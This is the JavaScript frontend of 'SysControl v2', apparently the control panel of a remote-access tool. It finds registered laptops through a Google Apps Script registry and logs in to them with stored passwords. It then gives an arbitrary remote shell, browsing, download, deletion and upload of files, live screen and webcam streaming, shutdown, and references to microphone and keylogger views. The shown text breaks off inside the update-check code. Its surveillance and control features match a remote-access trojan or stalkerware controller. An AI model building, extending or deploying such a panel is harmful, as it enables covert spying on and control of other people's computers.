/* SysControl v2 — Frontend */

const GAS_URL = "https://script.google.com/macros/s/AKfycbwVtNbpmiTUMGfTVIMkhdqV0qaKsbpPuMkdaEveKvpvNDERfpWghcatvSXh2IWSqC1l/exec";
const conn = { url: "", token: "", device: "", version: "" };
let devices = [];
let healthInterval = null;
let authUser = "";

const $ = (id) => document.getElementById(id);
const show = (id) => $(id).classList.remove("hidden");
const hide = (id) => $(id).classList.add("hidden");
const esc = (s) => { const d = document.createElement("div"); d.textContent = s; return d.innerHTML; };
const now = () => new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });

/* ═══ TOAST NOTIFICATIONS ═══ */

function toast(message, type = "info", duration = 3500) {
  const container = $("toasts");
  const el = document.createElement("div");
  el.className = `toast ${type}`;
  el.textContent = message;
  container.appendChild(el);
  const timer = setTimeout(() => dismissToast(el), duration);
  el.addEventListener("click", () => { clearTimeout(timer); dismissToast(el); });
}

function dismissToast(el) {
  if (!el.parentNode) return;
  el.classList.add("out");
  el.addEventListener("animationend", () => el.remove(), { once: true });
}

/* ═══ CUSTOM DIALOG ═══ */

function showDialog({ title = "Confirm", message = "", input = false, placeholder = "", value = "", confirmText = "OK", cancelText = "Cancel", danger = false }) {
  return new Promise((resolve) => {
    const backdrop = document.createElement("div");
    backdrop.className = "dialog-backdrop";

    const box = document.createElement("div");
    box.className = "dialog-box";

    let inputEl = null;
    box.innerHTML = `
      <div class="dialog-title">${esc(title)}</div>
      ${message ? `<div class="dialog-msg">${esc(message)}</div>` : ""}
      ${input ? `<input class="dialog-input" type="text" placeholder="${esc(placeholder)}" value="${esc(value)}">` : ""}
      <div class="dialog-actions">
        <button class="btn-sec dialog-cancel">${esc(cancelText)}</button>
        <button class="${danger ? "btn-danger" : "btn-pri"} dialog-confirm">${esc(confirmText)}</button>
      </div>
    `;

    backdrop.appendChild(box);
    document.body.appendChild(backdrop);

    if (input) {
      inputEl = box.querySelector(".dialog-input");
      inputEl.focus();
      inputEl.select();
      inputEl.addEventListener("keydown", (e) => {
        if (e.key === "Enter") { e.preventDefault(); finish(inputEl.value); }
        if (e.key === "Escape") finish(null);
      });
    }

    const finish = (result) => {
      backdrop.style.opacity = "0";
      backdrop.style.transition = "opacity 0.15s";
      setTimeout(() => backdrop.remove(), 150);
      resolve(result);
    };

    box.querySelector(".dialog-cancel").onclick = () => finish(null);
    box.querySelector(".dialog-confirm").onclick = () => {
      if (input) finish(inputEl.value);
      else finish(true);
    };
    backdrop.addEventListener("click", (e) => { if (e.target === backdrop) finish(null); });

    if (!input) box.querySelector(".dialog-confirm").focus();
  });
}

/* ═══ AUTH ═══ */

function checkAuth() {
  try { authUser = localStorage.getItem("sc_user") || ""; } catch { authUser = ""; }
  if (authUser) {
    hide("authScreen");
    show("homeScreen");
    loadDevices();
  } else {
    show("authScreen");
    hide("homeScreen");
    setTimeout(() => $("authUser").focus(), 100);
  }
}

async function doAuth() {
  const username = ($("authUser").value || "").trim();
  const password = $("authPass").value || "";
  if (!username || !password) {
    $("authError").textContent = "Enter username and password";
    return;
  }

  const btn = $("authBtn");
  btn.disabled = true;
  btn.textContent = "Authenticating...";
  $("authError").textContent = "";

  try {
    const r = await fetch(GAS_URL, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `action=login&username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
    });
    const d = await r.json();
    if (d.ok) {
      authUser = d.username || username;
      try { localStorage.setItem("sc_user", authUser); } catch {}
      hide("authScreen");
      show("homeScreen");
      loadDevices();
      toast(`Welcome back, ${authUser}`, "success");
    } else {
      $("authError").textContent = d.error || "Login failed";
    }
  } catch (e) {
    $("authError").textContent = "Cannot reach server";
  } finally {
    btn.disabled = false;
    btn.textContent = "Authenticate";
  }
}

function doLogout() {
  authUser = "";
  try { localStorage.removeItem("sc_user"); } catch {}
  hide("homeScreen");
  hide("panelScreen");
  show("authScreen");
  $("authUser").value = "";
  $("authPass").value = "";
  $("authError").textContent = "";
  conn.token = "";
  stopHealth();
}

/* ═══ DEVICE DISCOVERY ═══ */

function loadDevices() {
  if (!GAS_URL) {
    $("deviceList").innerHTML = '<div class="empty-state">Registry not configured.<br>Set GAS_URL in main.js</div>';
    return;
  }
  refreshDevices();
}

function parseDevices(rawDevices) {
  return rawDevices
    .filter((d) => d.password)
    .map((d) => ({
      deviceId: d.device_id,
      label: d.name || d.device_id,
      _url: d.url || "",
      _name: d.name || d.device_id,
      _version: d.version || "?",
      _online: false,
      _checking: false,
      _lastSeen: d.last_seen || "",
      _os: d.os || "",
      _password: d.password,
    }));
}

function discoverDevices() {
  const list = $("deviceList");
  list.innerHTML = '<div class="empty-state">Scanning devices...</div>';
  fetch(`${GAS_URL}?action=devices`)
    .then((r) => r.json())
    .then((data) => {
      if (!data.ok || !data.devices) {
        list.innerHTML = '<div class="empty-state">Cannot read device registry.</div>';
        return;
      }
      devices = parseDevices(data.devices);
      if (!devices.length) {
        list.innerHTML = '<div class="empty-state">No devices registered yet.<br>Run the backend on a laptop first.</div>';
        return;
      }
      renderDevices();
    })
    .catch(() => {
      list.innerHTML = '<div class="empty-state">Cannot reach registry. Check your connection.</div>';
    });
}

async function refreshDevices() {
  const btn = $("refreshBtn");
  btn.disabled = true;
  btn.textContent = "Scanning...";
  const list = $("deviceList");
  list.innerHTML = '<div class="empty-state"><div class="spinner"></div></div>';

  try {
    const r = await fetch(`${GAS_URL}?action=devices`);
    const data = await r.json();
    if (!data.ok || !data.devices) {
      list.innerHTML = '<div class="empty-state">Cannot read device registry.</div>';
      return;
    }
    devices = parseDevices(data.devices);
    devices.forEach((d) => { d._checking = true; });
    if (!devices.length) {
      list.innerHTML = '<div class="empty-state">No devices found.</div>';
      return;
    }
    renderDevices();
    await pingAllDevices();
  } catch {
    list.innerHTML = '<div class="empty-state">Cannot reach registry.</div>';
  } finally {
    btn.disabled = false;
    btn.textContent = "Scan";
  }
}

function pingAllDevices() {
  return Promise.all(
    devices.map(async (dev) => {
      if (!dev._url) { dev._online = false; dev._checking = false; renderDevices(); return; }
      try {
        const r = await fetch(`${dev._url}/api/status`, { signal: AbortSignal.timeout(5000) });
        const d = await r.json();
        dev._online = true;
        if (d.version) dev._version = d.version;
        if (d.os) dev._os = d.os;
      } catch {
        dev._online = false;
      } finally {
        dev._checking = false;
        renderDevices();
      }
    })
  );
}

function timeAgo(iso) {
  if (!iso) return "";
  const diff = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
  if (diff < 60) return "just now";
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  return `${Math.floor(diff / 86400)}d ago`;
}

function renderDevices() {
  const list = $("deviceList");
  if (!devices.length) {
    list.innerHTML = '<div class="empty-state">No devices found.<br>Run the backend on a laptop first.</div>';
    return;
  }
  list.innerHTML = "";
  devices.forEach((dev, i) => {
    const card = document.createElement("div");
    card.className = `device-card${dev._checking ? " checking" : ""}`;

    const statusCls = dev._checking ? "checking" : dev._online ? "online" : "offline";
    const dotCls = dev._checking ? "checking" : dev._online ? "online" : "";
    const statusText = dev._checking
      ? "Checking..."
      : dev._online
        ? `Online · ${dev._os || "Unknown"} · v${dev._version || "?"}`
        : `Offline${dev._lastSeen ? ` · last seen ${timeAgo(dev._lastSeen)}` : ""}`;

    card.innerHTML =
      `<div class="dc-icon">${esc((dev.label || "?").charAt(0).toUpperCase())}</div>` +
      `<div class="dc-info">` +
        `<div class="dc-name">${esc(dev.label || dev.deviceId)}</div>` +
        `<div class="dc-status ${statusCls}"><span class="dc-dot ${dotCls}"></span>${statusText}</div>` +
      `</div>` +
      `<span class="dc-arrow">›</span>`;
    card.onclick = () => connectDevice(i);
    list.appendChild(card);
  });
}

/* ═══ CONNECT ═══ */

function connectDevice(i) {
  const dev = devices[i];
  if (!dev._url || !dev._online) {
    const ago = dev._lastSeen ? ` Last seen ${timeAgo(dev._lastSeen)}.` : "";
    toast(`Device is offline.${ago} Start the backend first.`, "warning");
    return;
  }
  conn.url = dev._url;
  conn._idx = i;
  autoLogin(dev);
}

async function autoLogin(dev) {
  const card = document.querySelectorAll(".device-card")[conn._idx];
  if (card) {
    const status = card.querySelector(".dc-status");
    if (status) { status.textContent = "Connecting..."; status.className = "dc-status checking"; }
  }

  try {
    const r = await fetch(`${conn.url}/api/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password: dev._password }),
      signal: AbortSignal.timeout(8000),
    });
    const d = await r.json();
    if (d.ok) {
      conn.token = d.token;
      conn.device = d.device;
      conn.version = d.version;
      showPanel();
    } else {
      renderDevices();
      toast("Connection failed: " + (d.error || "wrong password"), "error");
    }
  } catch {
    renderDevices();
    toast("Cannot reach device. Click Scan to refresh.", "error");
  }
}

function showLoginModal(dev) {
  $("loginTitle").textContent = dev._name || dev.label || "Device";
  $("loginIcon").textContent = (dev.label || "?").charAt(0).toUpperCase();
  $("loginStatus").textContent = dev._url;
  $("loginError").textContent = "";
  $("loginPassword").value = "";
  show("loginModal");
  setTimeout(() => $("loginPassword").focus(), 100);
}

function hideLogin() { hide("loginModal"); }

async function doLogin() {
  const pw = $("loginPassword").value;
  if (!pw) return;
  const btn = $("loginBtn");
  btn.disabled = true;
  btn.textContent = "Connecting...";
  $("loginError").textContent = "";

  try {
    const r = await fetch(`${conn.url}/api/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password: pw }),
    });
    const d = await r.json();
    if (d.ok) {
      conn.token = d.token;
      conn.device = d.device;
      conn.version = d.version;
      hideLogin();
      showPanel();
    } else {
      $("loginError").textContent = d.error || "Login failed";
    }
  } catch (e) {
    $("loginError").textContent = "Cannot reach device";
  } finally {
    btn.disabled = false;
    btn.textContent = "Connect";
  }
}

/* ═══ PANEL ═══ */

function showPanel() {
  hide("homeScreen");
  show("panelScreen");
  $("panelName").textContent = conn.device;
  $("panelVersion").textContent = `v${conn.version}`;
  $("chatArea").innerHTML = "";
  addMsg("bot", `> connected to ${conn.device} [v${conn.version}]\n> use controls below`);
  startHealth();
}

function disconnect() {
  hide("panelScreen");
  show("homeScreen");
  $("chatArea").innerHTML = "";
  conn.token = "";
  stopHealth();
  closeLive(); closeLiveCam(); closeMic(); closeKeylog(); closeShell(); closeExplorer(); closeEditor();
  discoverDevices();
}

/* ═══ API HELPERS ═══ */

function api(path, opts = {}) {
  const h = opts.headers || {};
  if (conn.token && !h["Authorization"]) h["Authorization"] = `Bearer ${conn.token}`;
  opts.headers = h;
  return fetch(conn.url + path, opts).then((r) => r.json());
}

function apiRaw(path) {
  return fetch(conn.url + path, {
    headers: { Authorization: `Bearer ${conn.token}` },
  });
}

/* ═══ MESSAGES ═══ */

function addMsg(who, content, type) {
  const area = $("chatArea");
  const row = document.createElement("div");
  row.className = `msg ${who}`;
  const bubble = document.createElement("div");
  bubble.className = "bubble";

  if (type === "photo") {
    const img = document.createElement("img");
    img.src = content;
    img.loading = "lazy";
    img.onclick = (e) => { e.stopPropagation(); openLightbox(content); };
    bubble.appendChild(img);
  } else {
    const t = document.createElement("span");
    t.textContent = content;
    bubble.appendChild(t);
  }

  const ts = document.createElement("span");
  ts.className = "ts";
  ts.textContent = now();
  bubble.appendChild(ts);
  row.appendChild(bubble);
  area.appendChild(row);
  area.scrollTop = area.scrollHeight;
}

function addTyping() {
  const area = $("chatArea");
  const row = document.createElement("div");
  row.className = "msg bot";
  row.id = "typingMsg";
  row.innerHTML = '<div class="bubble"><div class="typing"><span></span><span></span><span></span></div></div>';
  area.appendChild(row);
  area.scrollTop = area.scrollHeight;
}

function removeTyping() {
  const t = $("typingMsg");
  if (t) t.remove();
}

/* ═══ COMMANDS ═══ */

async function execCmd(cmd) {
  addMsg("user", cmd);
  addTyping();
  try {
    const d = await api("/api/cmd", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cmd }),
    });
    removeTyping();
    if (d.type === "photo") {
      addMsg("bot", d.data, "photo");
      if (d.text) addMsg("bot", d.text);
    } else if (d.type === "shell") {
      addMsg("bot", (d.stdout || "") + (d.stderr || "") || "[No output]");
    } else {
      addMsg("bot", d.text || d.error || "No response.");
    }
  } catch (e) {
    removeTyping();
    addMsg("bot", `Error: ${e.message}`);
  }
}

async function confirmShutdown() {
  const ok = await showDialog({
    title: "Shutdown",
    message: "Are you sure you want to shut down this PC?",
    confirmText: "Shut Down",
    danger: true,
  });
  if (ok) execCmd("/shutdown");
}

async function promptSpeech() {
  const text = await showDialog({
    title: "Text to Speech",
    message: "Enter text to speak on the remote device:",
    input: true,
    placeholder: "Hello from SysControl...",
    confirmText: "Speak",
  });
  if (text && text.trim()) execCmd(`/speech ${text.trim()}`);
}

/* ═══ SHELL ═══ */

const shHistory = [];
let shIdx = -1, shCwd = "", shRunning = false;

function enterShell() {
  show("shellOverlay");
  if (!$("shOutput").innerHTML) {
    shAppend("SysControl Terminal\n", "sh-info");
  }
  api("/api/cmd", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cmd: "/shellcmd" }),
  }).then((d) => {
    if (d.type === "shell") { shCwd = d.cwd || ""; shPrompt(); }
  });
  setTimeout(() => $("shInput").focus(), 100);
}

function closeShell() { hide("shellOverlay"); }
function clearShell() { $("shOutput").innerHTML = ""; shAppend("Cleared.\n", "sh-info"); }

function shPrompt() {
  $("shCwd").textContent = shCwd || "~";
  const short = shCwd.length > 40 ? `...${shCwd.slice(-37)}` : shCwd;
  $("shPs1").textContent = `${short}>`;
}

function shAppend(text, cls) {
  if (!text) return;
  const el = document.createElement("div");
  el.className = `sh-line ${cls || ""}`;
  el.textContent = text;
  $("shOutput").appendChild(el);
  $("shOutput").scrollTop = $("shOutput").scrollHeight;
}

function shAppendPrompt(cwd, cmd) {
  const el = document.createElement("div");
  el.className = "sh-line";
  el.innerHTML = `<span class="sh-p">${esc(cwd)}&gt; </span><span class="sh-c">${esc(cmd)}</span>`;
  $("shOutput").appendChild(el);
  $("shOutput").scrollTop = $("shOutput").scrollHeight;
}

async function runShell() {
  const inp = $("shInput");
  const cmd = inp.value;
  if (!cmd.trim() || shRunning) return;
  inp.value = "";
  shHistory.push(cmd);
  if (shHistory.length > 100) shHistory.shift();
  shIdx = shHistory.length;
  shAppendPrompt(shCwd, cmd);
  shRunning = true;
  inp.placeholder = "Running...";

  try {
    const d = await api("/api/cmd", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cmd: `/shellcmd ${cmd}` }),
    });
    if (d.type === "shell") {
      if (d.stdout) shAppend(d.stdout, "sh-out");
      if (d.stderr) shAppend(d.stderr, "sh-err");
      shCwd = d.cwd || shCwd;
      shPrompt();
    } else {
      shAppend(d.text || d.error || "Error", "sh-err");
    }
  } catch (e) {
    shAppend(`Error: ${e.message}`, "sh-err");
  } finally {
    shRunning = false;
    inp.placeholder = "command...";
    inp.focus();
  }
}

function shellKey(e) {
  if (e.key === "Enter") runShell();
  else if (e.key === "ArrowUp") {
    e.preventDefault();
    if (shIdx > 0) { shIdx--; $("shInput").value = shHistory[shIdx]; }
  } else if (e.key === "ArrowDown") {
    e.preventDefault();
    if (shIdx < shHistory.length - 1) { shIdx++; $("shInput").value = shHistory[shIdx]; }
    else { shIdx = shHistory.length; $("shInput").value = ""; }
  }
}

/* ═══ FILE EXPLORER ═══ */

let exPath = "", exParent = "", exItems = [], drivesLoaded = false;

const EDITABLE = "txt,md,log,ini,cfg,conf,csv,json,xml,yml,yaml,toml,env,html,htm,css,js,ts,py,pyw,rb,php,go,rs,java,c,cpp,h,cs,sh,bat,cmd,vbs,ps1,sql,lua".split(",");
const isEditable = (n) => EDITABLE.includes((n.split(".").pop() || "").toLowerCase());

function openExplorer(path) {
  show("explorerOverlay");
  $("exList").innerHTML = '<div class="loading"><div class="spinner"></div></div>';
  if (!drivesLoaded) loadDrives();
  const cmd = path ? `/browse ${path}` : "/browse";
  api("/api/cmd", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cmd }),
  }).then((d) => {
    if (d.type === "browse") {
      exPath = d.path || "";
      exParent = d.parent || "";
      exItems = d.items || [];
      $("exTitle").textContent = exPath.split(/[/\\]/).pop() || "Root";
      $("exPath").textContent = exPath;
      $("exSearch").value = "";
      renderExplorer(exItems, d.error);
    }
  });
}

function loadDrives() {
  api("/api/cmd", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cmd: "/drives" }),
  }).then((d) => {
    if (d.type !== "drives") return;
    drivesLoaded = true;
    const bar = $("exDrives");
    bar.innerHTML = "";
    d.drives.forEach((drv) => {
      const btn = document.createElement("button");
      btn.className = "drive-btn";
      btn.textContent = drv.letter;
      btn.onclick = () => openExplorer(drv.path);
      bar.appendChild(btn);
    });
  });
}

let filterTimer = null;
function filterExplorer() {
  clearTimeout(filterTimer);
  filterTimer = setTimeout(() => {
    const q = ($("exSearch").value || "").trim().toLowerCase();
    if (!q) { renderExplorer(exItems); return; }
    renderExplorer(exItems.filter((it) => it.name.toLowerCase().includes(q)), "", true);
  }, 150);
}

function renderExplorer(items, error, filtering) {
  const list = $("exList");
  list.innerHTML = "";

  if (!filtering && exParent && exParent !== exPath) {
    const up = document.createElement("div");
    up.className = "ex-item";
    up.innerHTML = '<span class="ex-i">..</span><div class="ex-inf"><div class="ex-n">..</div></div>';
    up.onclick = () => openExplorer(exParent);
    up.style.cursor = "pointer";
    list.appendChild(up);
  }

  if (error) { list.innerHTML += `<div class="ex-empty">${esc(error)}</div>`; }

  if (!items.length && !error) {
    list.innerHTML += `<div class="ex-empty">${filtering ? "No match" : "Empty"}</div>`;
    return;
  }

  items.forEach((item) => {
    const row = document.createElement("div");
    row.className = "ex-item";
    const fp = `${exPath}\\${item.name}`;
    const icon = item.is_dir ? "\u{1F4C1}" : getFileIcon(item.name);

    row.innerHTML =
      `<span class="ex-i">${icon}</span>` +
      `<div class="ex-inf"><div class="ex-n">${esc(item.name)}</div><div class="ex-m">${item.is_dir ? "Folder" : fmtSize(item.size)}</div></div>` +
      (!item.is_dir ? `<button class="ex-a" data-action="dl">dl</button>` : "") +
      `<button class="ex-a" data-action="rn">rn</button>` +
      `<button class="ex-a del" data-action="rm">rm</button>`;

    row.querySelector('[data-action="dl"]')?.addEventListener("click", (e) => { e.stopPropagation(); dlFile(fp, item.name); });
    row.querySelector('[data-action="rn"]').addEventListener("click", (e) => { e.stopPropagation(); renItem(fp, item.name); });
    row.querySelector('[data-action="rm"]').addEventListener("click", (e) => { e.stopPropagation(); delItem(fp, item.name, item.is_dir); });

    if (item.is_dir) {
      row.style.cursor = "pointer";
      row.onclick = () => openExplorer(fp);
    } else if (isEditable(item.name) && item.size <= 1048576) {
      row.style.cursor = "pointer";
      row.onclick = () => openEditor(fp);
    }

    list.appendChild(row);
  });
}

function getFileIcon(name) {
  const ext = (name.split(".").pop() || "").toLowerCase();
  const map = {
    js: "\u{1F4DC}", ts: "\u{1F4DC}", py: "\u{1F40D}", json: "{ }",
    html: "❮❯", css: "#", md: "\u{1F4DD}", txt: "\u{1F4C4}",
    jpg: "\u{1F5BC}", png: "\u{1F5BC}", gif: "\u{1F5BC}", svg: "\u{1F5BC}",
    pdf: "\u{1F4D1}", zip: "\u{1F4E6}", exe: "⚙", bat: "▶",
    log: "\u{1F4CB}", sql: "\u{1F5C3}", xml: "❮❯", yml: "⚙",
    yaml: "⚙", csv: "\u{1F4CA}", sh: "$",
  };
  return map[ext] || "\u{1F4C4}";
}

function explorerBack() { if (exParent && exParent !== exPath) openExplorer(exParent); }
function closeExplorer() { hide("explorerOverlay"); }

function dlFile(fp, fn) {
  api("/api/cmd", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cmd: `/download ${fp}` }),
  }).then((d) => {
    if (d.type === "file" && d.data) {
      const bc = atob(d.data);
      const bn = new Uint8Array(bc.length);
      for (let i = 0; i < bc.length; i++) bn[i] = bc.charCodeAt(i);
      const blob = new Blob([bn]);
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = d.name || fn;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      toast(`Downloaded ${d.name || fn}`, "success");
    }
  });
}

async function delItem(fp, name, isDir) {
  const ok = await showDialog({
    title: "Delete",
    message: `Delete "${name}"? This cannot be undone.`,
    confirmText: "Delete",
    danger: true,
  });
  if (!ok) return;
  api("/api/cmd", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cmd: `/delete ${fp}` }),
  }).then(() => {
    openExplorer(exPath);
    toast(`Deleted ${name}`, "info");
  });
}

async function renItem(fp, old) {
  const n = await showDialog({
    title: "Rename",
    input: true,
    placeholder: "New name",
    value: old,
    confirmText: "Rename",
  });
  if (!n || n.trim() === old) return;
  api("/api/cmd", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cmd: `/rename ${fp}|${n.trim()}` }),
  }).then(() => {
    openExplorer(exPath);
    toast(`Renamed to ${n.trim()}`, "success");
  });
}

async function createFolder() {
  const n = await showDialog({
    title: "New Folder",
    input: true,
    placeholder: "Folder name",
    confirmText: "Create",
  });
  if (!n) return;
  api("/api/cmd", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cmd: `/mkdir ${exPath}\\${n.trim()}` }),
  }).then(() => {
    openExplorer(exPath);
    toast(`Created folder ${n.trim()}`, "success");
  });
}

async function createFile() {
  const n = await showDialog({
    title: "New File",
    input: true,
    placeholder: "File name (e.g. notes.txt)",
    confirmText: "Create",
  });
  if (!n) return;
  api("/api/cmd", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ cmd: `/mkfile ${exPath}\\${n.trim()}` }),
  }).then(() => {
    openExplorer(exPath);
    toast(`Created ${n.trim()}`, "success");
  });
}

function uploadToExplorer() { $("exFileInput").value = ""; $("exFileInput").click(); }

function handleUpload(input) {
  if (!input.files || !input.files.length) return;
  const files = Array.from(input.files);
  let idx = 0;

  function next() {
    if (idx >= files.length) {
      openExplorer(exPath);
      toast(`Uploaded ${files.length} file${files.length > 1 ? "s" : ""}`, "success");
      return;
    }
    const file = files[idx++];
    if (file.size > 15728640) {
      toast(`${file.name} too large (max 15 MB)`, "warning");
      next();
      return;
    }
    const reader = new FileReader();
    reader.onload = () => {
      const b64 = reader.result.split(",")[1];
      fetch(`${conn.url}/api/upload`, {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${conn.token}` },
        body: JSON.stringify({ name: file.name, path: exPath, data: b64 }),
      }).then(() => next()).catch(() => next());
    };
    reader.readAsDataURL(file);
  }
  next();
}

function fmtSize(b) {
  if (b === 0) return "0 B";
  const k = 1024;
  const s = ["B", "KB", "MB", "GB"];
  const i = Math.floor(Math.log(b) / Math.log(k));
  return `${parseFloat((b / Math.pow(k, i)).toFixed(1))} ${s[i]}`;
}

/* ═══ FILE EDITOR ═══ */

const edState = { path: "", enc: "utf-8", orig: "", dirty: false };

async function openEditor(path) {
  show("editorOverlay");
  $("edTitle").textContent = path.split(/[/\\]/).pop();
  $("edPath").textContent = path;
  $("edContent").value = "";
  $("edContent").disabled = true;
  $("edStatus").textContent = "Loading...";
  $("edDirty").classList.add("hidden");
  edState.path = path;
  edState.dirty = false;

  try {
    const r = await fetch(`${conn.url}/api/read-file`, {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${conn.token}` },
      body: JSON.stringify({ path }),
    });
    const d = await r.json();
    if (!d.ok) { $("edStatus").textContent = d.error || "Failed"; return; }
    edState.enc = d.encoding || "utf-8";
    edState.orig = d.content || "";
    $("edContent").value = edState.orig;
    $("edContent").disabled = false;
    $("edStatus").textContent = `${d.encoding} · ${fmtSize(d.size || 0)}`;
  } catch {
    $("edStatus").textContent = "Failed to load file";
  }
}

function edChanged() {
  const dirty = $("edContent").value !== edState.orig;
  if (dirty !== edState.dirty) {
    edState.dirty = dirty;
    $("edDirty").classList.toggle("hidden", !dirty);
  }
}

function edKey(e) {
  if ((e.ctrlKey || e.metaKey) && e.key === "s") {
    e.preventDefault();
    saveEditor();
  }
  if (e.key === "Tab") {
    e.preventDefault();
    const el = e.target;
    const s = el.selectionStart;
    const en = el.selectionEnd;
    el.value = el.value.substring(0, s) + "  " + el.value.substring(en);
    el.selectionStart = el.selectionEnd = s + 2;
    edChanged();
  }
}

async function saveEditor() {
  if (!edState.path) return;
  $("edStatus").textContent = "Saving...";
  try {
    const r = await fetch(`${conn.url}/api/save-file`, {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${conn.token}` },
      body: JSON.stringify({ path: edState.path, content: $("edContent").value, encoding: edState.enc }),
    });
    const d = await r.json();
    if (d.ok) {
      edState.orig = $("edContent").value;
      edState.dirty = false;
      $("edDirty").classList.add("hidden");
      $("edStatus").textContent = "Saved";
      toast("File saved", "success");
    } else {
      $("edStatus").textContent = d.error || "Save failed";
    }
  } catch {
    $("edStatus").textContent = "Save failed";
  }
}

async function closeEditor() {
  if (edState.dirty) {
    const ok = await showDialog({
      title: "Unsaved Changes",
      message: "Discard unsaved changes?",
      confirmText: "Discard",
      danger: true,
    });
    if (!ok) return;
  }
  hide("editorOverlay");
  edState.path = "";
  edState.dirty = false;
}

/* ═══ LIVE SCREEN ═══ */

const live = { on: false, q: "med", delay: 50, frames: 0, t0: 0, busy: false };
const LIVE_DELAY = { low: 150, med: 50, high: 10 };

function openLiveScreen() {
  show("liveOverlay");
  live.on = true;
  live.frames = 0;
  live.t0 = Date.now();
  setLiveQ(live.q);
}

function setLiveQ(q) {
  live.q = q;
  live.delay = LIVE_DELAY[q] || 50;
  document.querySelectorAll(".qb[data-q]").forEach((b) => b.classList.toggle("active", b.getAttribute("data-q") === q));
  if (live.on && !live.busy) fetchFrame();
}

function fetchFrame() {
  if (!live.on || live.busy) return;
  live.busy = true;
  apiRaw(`/api/screen-live?q=${live.q}&t=${Date.now()}`)
    .then((r) => r.blob())
    .then((blob) => {
      if (!live.on) return;
      const url = URL.createObjectURL(blob);
      const img = $("liveImg");
      const old = img.src;
      img.onload = () => { if (old?.startsWith("blob:")) URL.revokeObjectURL(old); };
      img.src = url;
      live.frames++;
      const el = Date.now() - live.t0;
      if (el >= 1000) {
        $("liveMeta").textContent = `${(live.frames * 1000 / el).toFixed(1)} fps`;
        live.frames = 0;
        live.t0 = Date.now();
      }
      live.busy = false;
      if (live.on) setTimeout(fetchFrame, live.delay);
    })
    .catch(() => { live.busy = false; if (live.on) setTimeout(fetchFrame, 200); });
}

function closeLive() {
  live.on = false;
  hide("liveOverlay");
  const img = $("liveImg");
  if (img.src?.startsWith("blob:")) URL.revokeObjectURL(img.src);
  img.src = "";
}

/* ═══ LIVE CAM ═══ */

const cam = { on: false, q: "med", delay: 50, frames: 0, t0: 0, busy: false };
const CAM_DELAY = { low: 150, med: 50, high: 10 };

async function openLiveCam() {
  show("camOverlay");
  cam.on = false;
  cam.frames = 0;
  cam.t0 = Date.now();
  $("camMeta").textContent = "Starting camera...";
  setCamQ(cam.q);

  try {
    const d = await api("/api/webcam/start", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: "{}",
    });
    if (d.ok) {
      cam.on = true;
      fetchCamFrame();
    } else {
      $("camMeta").textContent = d.error || "Camera unavailable";
    }
  } catch {
    $("camMeta").textContent = "Error connecting";
  }
}

function setCamQ(q) {
  cam.q = q;
  cam.delay = CAM_DELAY[q] || 50;
  document.querySelectorAll(".cam-qb").forEach((b) => b.classList.toggle("active", b.getAttribute("data-cq") === q));
}

function fetchCamFrame() {
  if (!cam.on || cam.busy) return;
  cam.busy = true;
  apiRaw(`/api/webcam-live?q=${cam.q}&t=${Date.now()}`)
    .then((r) => {
      if (!r.ok) throw new Error("no frame");
      const ct = r.headers.get("content-type") || "";
      if (!ct.includes("image")) throw new Error("not image");
      return r.blob();
    })
    .then((blob) => {
      if (!cam.on) return;
      const url = URL.createObjectURL(blob);
      const img = $("camImg");
      const old = img.src;
      img.onload = () => { if (old?.startsWith("blob:")) URL.revokeObjectURL(old); };
      img.src = url;
      cam.frames++;
      const el = Date.now() - cam.t0;
      if (el >= 1000) {
        $("camMeta").textContent = `${(cam.frames * 1000 / el).toFixed(1)} fps`;
        cam.frames = 0;
        cam.t0 = Date.now();
      }
      cam.busy = false;
      if (cam.on) setTimeout(fetchCamFrame, cam.delay);
    })
    .catch(() => { cam.busy = false; if (cam.on) setTimeout(fetchCamFrame, 300); });
}

function closeLiveCam() {
  cam.on = false;
  hide("camOverlay");
  const img = $("camImg");
  if (img.src?.startsWith("blob:")) URL.revokeObjectURL(img.src);
  img.src = "";
  api("/api/webcam/stop", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" }).catch(() => {});
}

/* ═══ UPDATE ═══ */

let _updateInfo = null;
let _updatePoll = null;

function checkUpdate() {
  _updateInfo = null;
  show("updateModal");
  _updateSetBody('<div style="text-align:center;padding:24px 0"><div class="spinner"></div><p style="color:var(--dim);margin-top:16px">Checking for updates...</p></div>', "none", "none");

  api("/api/update/check", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" })
    .then((d) => {
      if (d.update_available) {
        _updateInfo = d;
        let dateStr = d.date || "";
        if (dateStr && dateStr.length > 10) {
          try { dateStr = new Date(dateStr).toLocaleDateString(); } catch {}
        }
        _updateSetBody(
          `<div style="text-align:center;padding:8px 0">
            <div style="font-size:20px;margin-bottom:14px;color:var(--cyan)">↑</div>
            <p style="font-size:14px;margin-bottom:16px;color:var(--accent)">Update Available</p>
            <div class="update-info">
